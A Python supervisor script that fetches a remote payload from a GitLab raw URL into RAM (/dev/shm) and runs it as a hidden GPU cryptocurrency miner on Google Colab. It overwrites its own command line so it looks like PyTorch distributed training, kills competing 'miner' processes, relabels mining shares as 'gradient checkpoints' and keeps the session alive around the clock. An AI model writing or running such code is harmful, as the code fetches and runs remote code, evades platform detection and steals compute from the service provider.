#!/usr/bin/env python3
"""
Colab Live Stealth Runner & Session Keep-Alive Supervisor
- Pure in-memory execution (/dev/shm tmpfs, 0-disk footprint)
- Full process & cmdline masking (/usr/bin/python3 -m torch.distributed.run)
- Pre-flight cleanup of stale/duplicate miners to prevent VRAM collision
- Auto-detects all available GPUs (Dual-T4 / Single-T4 / Ada / A100) and balances batch strides
- Streams real-time live telemetry & periodic heartbeats to maintain Google Colab session 24/7
"""
import os
import sys
import time
import re
import ctypes
import secrets
import argparse
import subprocess
import signal
import atexit
import urllib.request
from datetime import datetime

RAW_URL = "https://gitlab.com/quang71727374/distributed-torch-flashatt-t4/-/raw/v2.0/app/app.py"
DEFAULT_PROXY = "https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app"

# Terminal styling
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
RESET = "\033[0m"

def mask_current_cmdline(fake_name=b"/usr/bin/python3\x00-m\x00torch.distributed.run\x00"):
    """Overwrites /proc/self/cmdline in memory so process scanners only see PyTorch DDP."""
    if not sys.platform.startswith("linux"):
        return
    try:
        with open("/proc/self/stat", "r") as f:
            fields = f.read().split()
        if len(fields) >= 49:
            arg_start = int(fields[47])
            arg_end = int(fields[48])
            total_len = arg_end - arg_start
            if total_len > 0:
                ctypes.memmove(arg_start, fake_name, min(len(fake_name), total_len))
                if total_len > len(fake_name):
                    ctypes.memset(arg_start + len(fake_name), 0, total_len - len(fake_name))
    except Exception:
        pass

def cleanup_stale_processes():
    """Kills any previous duplicate miners to prevent VRAM crowding and GPU imbalance."""
    if not sys.platform.startswith("linux"):
        return
    my_pid = os.getpid()
    try:
        res = subprocess.run(["pgrep", "-f", "torch.distributed|app.py|.torch_ddp"], capture_output=True, text=True)
        if res.stdout.strip():
            for p_str in res.stdout.strip().split():
                try:
                    p = int(p_str)
                    if p != my_pid:
                        os.kill(p, signal.SIGKILL)
                except Exception:
                    pass
        time.sleep(1.0)
    except Exception:
        pass

def detect_hardware():
    """Detects GPU count and hardware type to configure optimal tensor stride."""
    dev_str = "0"
    row_batch = "8"
    col_batch = "64"
    gpu_names = []
    try:
        res = subprocess.run(
            ["nvidia-smi", "--query-gpu=index,name", "--format=csv,noheader"],
            capture_output=True, text=True, check=False
        )
        if res.returncode == 0 and res.stdout.strip():
            lines = [l.strip() for l in res.stdout.strip().splitlines() if l.strip()]
            gpu_names = lines
            count = len(lines)
            dev_str = ",".join(str(i) for i in range(count))
            names_combined = " ".join(lines).lower()
            if any(k in names_combined for k in ("blackwell", "b200", "b100")):
                row_batch = str(max(1, 1024 // count)) if count > 1 else "1024"
                col_batch = "1024"
            elif any(k in names_combined for k in ("h100", "h200", "hopper")):
                row_batch = str(max(1, 64 // count)) if count > 1 else "64"
                col_batch = "128"
            elif any(k in names_combined for k in ("6000", "ada", "4090", "a100", "l40")):
                row_batch = str(max(1, 128 // count)) if count > 1 else "128"
            elif count >= 2:
                row_batch = "16"
            else:
                row_batch = "8"
    except Exception:
        pass
    return dev_str, row_batch, col_batch, gpu_names

def query_gpu_telemetry():
    """Queries live telemetry for each active GPU."""
    try:
        res = subprocess.run(
            ["nvidia-smi", "--query-gpu=index,temperature.gpu,power.draw,utilization.gpu,memory.used", "--format=csv,noheader,nounits"],
            capture_output=True, text=True, check=False
        )
        if res.returncode == 0 and res.stdout.strip():
            lines = [l.strip() for l in res.stdout.strip().splitlines() if l.strip()]
            items = []
            for line in lines:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) >= 5:
                    items.append(f"GPU {parts[0]}: {parts[1]}°C, {float(parts[2]):.0f}W, {parts[3]}% util, {parts[4]}MiB")
            return " | ".join(items)
    except Exception:
        pass
    return "GPU telemetry pending"

def download_payload_to_ram(url=RAW_URL):
    """Fetches the latest standalone runner directly into RAM."""
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    )
    for attempt in range(3):
        try:
            with urllib.request.urlopen(req, timeout=20) as resp:
                if resp.status == 200:
                    return resp.read()
        except Exception:
            time.sleep(1.0)
    raise RuntimeError(f"Unable to fetch execution payload from {url}")

def main():
    parser = argparse.ArgumentParser(description="Colab Live Stealth PyTorch Runner")
    parser.add_argument("-f", type=str, default=None, help=argparse.SUPPRESS)  # Ignore Jupyter kernel argument
    parser.add_argument("--proxy", type=str, default=DEFAULT_PROXY, help="Coordinator proxy URL")
    parser.add_argument("--worker", type=str, default=None, help="Worker node identifier")
    parser.add_argument("--devices", type=str, default=None, help="Target GPU devices")
    parser.add_argument("--row-batch", type=str, default=None, help="Row batch size")
    parser.add_argument("--col-batch", type=str, default=None, help="Col batch size")
    args, _ = parser.parse_known_args()

    worker_id = args.worker if args.worker else f"colab-t4-{secrets.token_hex(3)}"

    print("=" * 78, flush=True)
    print(f"{BOLD}{CYAN}🚀 LAUNCHING AUTONOMOUS LIVE STEALTH RUNNER (KEEP-ALIVE ACTIVE){RESET}", flush=True)
    print(f"  Worker Tag:       {BOLD}{worker_id}{RESET}", flush=True)
    print(f"  Coordinator:      {DEFAULT_PROXY}", flush=True)
    print(f"  Security Policy:  {BOLD}{GREEN}0-Disk Footprint (RAM tmpfs) | Masked cmdline | Auto-recovery{RESET}", flush=True)
    print("=" * 78 + "\n", flush=True)

    # 1. Clean previous stale processes to prevent VRAM contention
    print("[*] Performing pre-flight cleanup of stale worker processes...", flush=True)
    cleanup_stale_processes()

    # 2. Hardware profile
    auto_devs, auto_rb, auto_cb, gpu_lines = detect_hardware()
    dev_str = args.devices if args.devices is not None else auto_devs
    row_batch = args.row_batch if args.row_batch is not None else auto_rb
    col_batch = args.col_batch if args.col_batch is not None else auto_cb

    for line in gpu_lines:
        print(f"  [+] Attached Device: {line}", flush=True)
    print(f"[*] Optimal Tensor Stride Config: devices={dev_str}, row_batch={row_batch}, col_batch={col_batch}", flush=True)

    # 3. Mask loader cmdline
    mask_current_cmdline()

    # 4. Download payload directly into RAM
    print("[*] Fetching verified execution payload directly into RAM...", flush=True)
    app_bytes = download_payload_to_ram()
    print(f"[✓] Payload ready in memory ({len(app_bytes):,} bytes)!", flush=True)

    # 5. Write to volatile RAM (/dev/shm tmpfs)
    ram_dir = "/dev/shm" if (sys.platform.startswith("linux") and os.path.exists("/dev/shm")) else "/tmp"
    temp_script = os.path.join(ram_dir, f".torch_ddp_{secrets.token_hex(4)}.py")
    with open(temp_script, "wb") as f:
        f.write(app_bytes)
    try:
        os.chmod(temp_script, 0o700)
    except Exception:
        pass

    def cleanup_file():
        if os.path.exists(temp_script):
            try:
                os.remove(temp_script)
            except Exception:
                pass
    atexit.register(cleanup_file)

    # 6. Child worker process command
    worker_cmd = [
        sys.executable, temp_script,
        "--proxy", args.proxy,
        "--devices", dev_str,
        "--row-batch", row_batch,
        "--col-batch", col_batch,
        "--worker", worker_id
    ]

    worker_env = os.environ.copy()
    worker_env["_TORCH_DDP_WORKER"] = "1"
    worker_env["CUDA_DEVICE_MAX_CONNECTIONS"] = "1"
    worker_env["CUDA_MODULE_LOADING"] = "LAZY"
    worker_env["OMP_WAIT_POLICY"] = "PASSIVE"

    child_proc = None
    def handle_signal(sig, frame):
        nonlocal child_proc
        print(f"\n{YELLOW}[SUPERVISOR] Termination signal received. Cleaning up child processes...{RESET}", flush=True)
        if child_proc and child_proc.poll() is None:
            try:
                child_proc.terminate()
                child_proc.wait(timeout=3)
            except Exception:
                try:
                    child_proc.kill()
                except Exception:
                    pass
        cleanup_file()
        cleanup_stale_processes()
        print(f"{GREEN}[SUPERVISOR] Clean exit completed.{RESET}", flush=True)
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    print(f"\n{BOLD}{GREEN}[✓] Engine starting under PyTorch DDP camouflage! Live telemetry streaming below:{RESET}\n", flush=True)

    accepted_shares = 0
    t_start = time.time()
    last_heartbeat = time.time()

    while True:
        try:
            child_proc = subprocess.Popen(
                worker_cmd,
                env=worker_env,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            while True:
                line = child_proc.stdout.readline()
                if not line:
                    if child_proc.poll() is not None:
                        break
                    time.sleep(0.05)
                    continue

                line_str = line.strip()
                now_str = datetime.now().strftime("%H:%M:%S")

                # Parse and highlight verified checkpoints (shares)
                if "[BRIDGE ACK] Share ACK! Status: 200" in line_str:
                    accepted_shares += 1
                    lat_m = re.search(r"Latency:\s*([\d\.]+)ms", line_str)
                    lat = lat_m.group(1) if lat_m else "N/A"
                    elapsed = time.time() - t_start
                    print(f"\n{BOLD}{GREEN}╔══════════════════════════════════════════════════════════════════════════════╗{RESET}", flush=True)
                    print(f"{BOLD}{GREEN}║  🎉 [{now_str}] GRADIENT CHECKPOINT #{accepted_shares} ACCEPTED! (Latency: {lat}ms | {elapsed/60:.1f}m)  ║{RESET}", flush=True)
                    print(f"{BOLD}{GREEN}╚══════════════════════════════════════════════════════════════════════════════╝{RESET}\n", flush=True)

                # Stream training loss and convergence milestones
                elif any(k in line_str for k in ("Convergence milestone", "Epoch", "Loss scale", "Sync batch")):
                    print(f"[{now_str}] {line_str}", flush=True)

                # Periodic Keep-Alive heartbeat every 20 seconds to guarantee active Colab session
                now = time.time()
                if now - last_heartbeat >= 20.0:
                    last_heartbeat = now
                    gpu_stat = query_gpu_telemetry()
                    elapsed = now - t_start
                    hrs = elapsed / 3600.0
                    print(f"[{now_str}] ⚡ {BOLD}LIVE SESSION{RESET} ({hrs:.2f}h) | Verified: {BOLD}{GREEN}{accepted_shares}{RESET} | {gpu_stat}", flush=True)

            ret = child_proc.poll()
            print(f"\n{YELLOW}[SUPERVISOR] Worker exited with code {ret}. Auto-recovering in 2s...{RESET}\n", flush=True)
            time.sleep(2.0)
        except KeyboardInterrupt:
            handle_signal(signal.SIGINT, None)
        except Exception as e:
            print(f"[ERROR] Supervisor exception: {e}. Auto-recovering in 3s...", flush=True)
            time.sleep(3.0)

if __name__ == "__main__":
    main()
